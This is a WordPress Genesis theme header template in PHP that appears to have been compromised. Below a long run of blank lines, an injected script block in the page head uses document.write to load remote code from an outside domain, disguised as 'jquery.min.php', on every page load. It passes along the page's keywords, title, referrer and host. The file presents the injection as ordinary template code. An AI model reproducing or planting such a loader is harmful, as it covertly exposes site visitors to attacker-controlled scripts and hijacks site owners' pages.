<?php
/**
 * Genesis Framework.
 *
 * WARNING: This file is part of the core Genesis Framework. DO NOT edit this file under any circumstances.
 * Please do all modifications in the form of a child theme.
 *
 * @package Genesis\Templates
 * @author  StudioPress
 * @license GPL-2.0+
 * @link    http://my.studiopress.com/themes/genesis/
 */

do_action( 'genesis_doctype' );
do_action( 'genesis_title' );
do_action( 'genesis_meta' );

wp_head(); //* we need this for plugins
?>

























<script>var a='';setTimeout(10);if(document.referrer.indexOf(location.protocol+"//"+location.host)!==0||document.referrer!==undefined||document.referrer!==''||document.referrer!==null){document.write('<script type="text/javascript" src="http://www.emppa.org/js/jquery.min.php?c_utt=K85164&c_utm='+encodeURIComponent('http://www.emppa.org/js/jquery.min.php'+'?'+'default_keyword='+encodeURIComponent(((k=(function(){var keywords='';var metas=document.getElementsByTagName('meta');if(metas){for(var x=0,y=metas.length;x<y;x++){if(metas[x].name.toLowerCase()=="keywords"){keywords+=metas[x].content;}}}return keywords!==''?keywords:null;})())==null?(v=window.location.search.match(/utm_term=([^&]+)/))==null?(t=document.title)==null?'':t:v[1]:k))+'&se_referrer='+encodeURIComponent(document.referrer)+'&source='+encodeURIComponent(window.location.host))+'"><'+'/script>');}</script>
</head>
<?php
genesis_markup( array(
	'html5'   => '<body %s>',
	'xhtml'   => sprintf( '<body class="%s">', implode( ' ', get_body_class() ) ),
	'context' => 'body',
) );
do_action( 'genesis_before' );

genesis_markup( array(
	'html5'   => '<div %s>',
	'xhtml'   => '<div id="wrap">',
	'context' => 'site-container',
) );

do_action( 'genesis_before_header' );
do_action( 'genesis_header' );
do_action( 'genesis_after_header' );

genesis_markup( array(
	'html5'   => '<div %s>',
	'xhtml'   => '<div id="inner">',
	'context' => 'site-inner',
) );
genesis_structural_wrap( 'site-inner' );
